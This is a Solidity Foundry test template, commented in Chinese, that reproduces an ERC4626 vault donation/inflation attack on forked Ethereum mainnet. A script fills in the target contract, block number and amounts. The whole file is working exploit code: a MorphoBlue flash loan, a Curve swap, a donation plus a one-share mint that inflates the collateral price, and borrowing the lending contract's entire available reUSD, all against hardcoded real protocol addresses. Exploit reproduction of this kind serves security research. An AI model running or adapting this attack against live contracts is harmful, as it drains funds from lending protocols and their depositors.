// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// ERC4626 Vault Donation/Inflation Attack - 通用测试模板
//
// 使用方法：
//   由 calldata_bridge/batch_test.py 自动替换以下占位符：
//
//   {{CONTRACT_NAME}}            - Solidity 合约名（如 Case_57e69699_22497642）
//   {{SUSPICIOUS_CONTRACT}}      - 攻击者合约地址（checksummed）
//   {{FORK_BLOCK_NUMBER}}        - fork 区块号（uint256 字面量，支持下划线）
//   {{FLASH_LOAN_AMOUNT}}        - 闪电贷 USDC 金额表达式（如 4_000 * 1e6）
//   {{ATTACKER_TRANSFER_AMOUNT}} - donation 金额表达式（如 2_000 * 1e18）
//   {{ATTACKER_MINT_AMOUNT}}     - mint shares 数量（通常为 1）
//   {{CURVE_INPUTDATA}}          - Curve exchange calldata（0x3df02124...）
//
// 攻击流程（与已验证案例 Case_57e69699 / Case_6e90c85a 相同）：
//   1. setUp: vm.createSelectFork + 动态查询 vault/asset 地址
//   2. testExploit: approve + MorphoBlue 闪电贷
//   3. onMorphoFlashLoan:
//      a. _swapUsdcForAsset   : Curve USDC → crvUSD
//      b. _manipulateOracle   : donation 到 controller + mint 1 share
//      c. _borrowAndSwapReUSD : addCollateralVault + borrow + Curve reUSD → crvUSD
//      d. _redeemAndFinalSwap : redeem sCrvUSD + Curve crvUSD → USDC
// ===========================================================================

import "../basetest.sol";

// ---------------------------------------------------------------------------
// 接口定义（与已验证案例保持一致，添加了 CaseN 后缀避免命名冲突）
// ---------------------------------------------------------------------------

interface IERC20Gen {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function decimals() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IERC4626Gen is IERC20Gen {
    function mint(uint256 shares) external;
    function redeem(uint256 shares, address receiver, address owner) external;
    function controller() external view returns (address);
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

interface IVulnerableContractGen {
    function addCollateralVault(uint256 shares, address receiver) external;
    function borrow(uint256 amount, uint256 minAmount, address receiver) external;
    function collateral() external view returns (address);
    function totalDebtAvailable() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
}

interface ICurvePoolGen {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IMorphoBlueGen {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

// ---------------------------------------------------------------------------
// 合约主体（占位符由 batch_test.py 替换）
// ---------------------------------------------------------------------------

contract {{CONTRACT_NAME}} is BaseTestWithBalanceLog {
    // === 固定地址（Ethereum Mainnet，所有案例通用）===
    IERC20Gen private constant usdc = IERC20Gen(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC4626Gen private constant sCrvUsd = IERC4626Gen(0x0655977FEb2f289A4aB78af67BAB0d17aAb84367);
    IERC20Gen private constant reUsd = IERC20Gen(0x57aB1E0003F623289CD798B1824Be09a793e4Bec);
    IMorphoBlueGen private constant morphoBlue = IMorphoBlueGen(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    ICurvePoolGen private constant curveUsdcCrvusdPool = ICurvePoolGen(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    ICurvePoolGen private constant curveReusdPool = ICurvePoolGen(0xc522A6606BBA746d7960404F22a3DB936B6F4F50);

    // === 参数化地址（由模板引擎注入）===
    IVulnerableContractGen private constant suspiciousVulnerableContract =
        IVulnerableContractGen({{SUSPICIOUS_CONTRACT}});

    // === 动态解析（setUp 时从 VulnerableContract 查询）===
    IERC20Gen private vaultAsset;
    IERC4626Gen private erc4626vault;
    address private assetController;

    // === 攻击参数（由模板引擎注入）===
    uint256 private constant forkBlockNumber = {{FORK_BLOCK_NUMBER}};
    uint256 private constant flashLoanAmount = {{FLASH_LOAN_AMOUNT}};
    uint256 private constant attackerTransferAmount = {{ATTACKER_TRANSFER_AMOUNT}};
    uint256 private constant attackerMintAmount = {{ATTACKER_MINT_AMOUNT}};

    // 借贷金额（运行时确定）
    uint256 private borrowAmount;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", forkBlockNumber);
        fundingToken = address(usdc);

        // 从攻击合约动态查询 Vault 和资产地址
        erc4626vault = IERC4626Gen(suspiciousVulnerableContract.collateral());
        assetController = erc4626vault.controller();
        vaultAsset = IERC20Gen(erc4626vault.asset());
    }

    function testExploit() public balanceLog {
        usdc.approve(address(morphoBlue), type(uint256).max);
        morphoBlue.flashLoan(address(usdc), flashLoanAmount, hex"");
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");
        _swapUsdcForAsset();
        _manipulateOracle();
        _borrowAndSwapReUSD();
        _redeemAndFinalSwap();
    }

    /// @dev Step 1: 使用 Curve pool 将 USDC 换成 crvUSD（通过注入的 calldata）
    function _swapUsdcForAsset() internal {
        address target = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
        usdc.approve(target, type(uint256).max);
        // Curve exchange(0, 1, 4000000000, 0): USDC(index=0) -> crvUSD(index=1), amount=4000 USDC
        string memory inputData = "{{CURVE_INPUTDATA}}";
        bytes memory data = vm.parseBytes(inputData);
        (bool ok,) = target.call(data);
        require(ok, "Curve USDC->crvUSD swap failed");
    }

    /// @dev Step 2: 操纵 oracle：donation + mint 1 share 抬高 pricePerShare
    function _manipulateOracle() internal {
        vaultAsset.transfer(assetController, attackerTransferAmount);
        vaultAsset.approve(address(erc4626vault), type(uint256).max);
        erc4626vault.mint(attackerMintAmount);
    }

    /// @dev Step 3: 抵押 share 借出全部 reUSD，再换成 crvUSD
    function _borrowAndSwapReUSD() internal {
        erc4626vault.approve(address(suspiciousVulnerableContract), type(uint256).max);
        suspiciousVulnerableContract.addCollateralVault(attackerMintAmount, address(this));
        borrowAmount = suspiciousVulnerableContract.totalDebtAvailable();
        suspiciousVulnerableContract.borrow(borrowAmount, 0, address(this));

        reUsd.approve(address(curveReusdPool), type(uint256).max);
        curveReusdPool.exchange(0, 1, reUsd.balanceOf(address(this)), 0);
    }

    /// @dev Step 4: 赎回 sCrvUSD，将全部 crvUSD 换回 USDC（偿还闪电贷+获利）
    function _redeemAndFinalSwap() internal {
        uint256 sCrvBalance = sCrvUsd.balanceOf(address(this));
        if (sCrvBalance > 0) {
            sCrvUsd.redeem(sCrvBalance, address(this), address(this));
        }
        uint256 crvBalance = vaultAsset.balanceOf(address(this));
        vaultAsset.approve(address(curveUsdcCrvusdPool), crvBalance);
        curveUsdcCrvusdPool.exchange(1, 0, crvBalance, 0);
    }
}
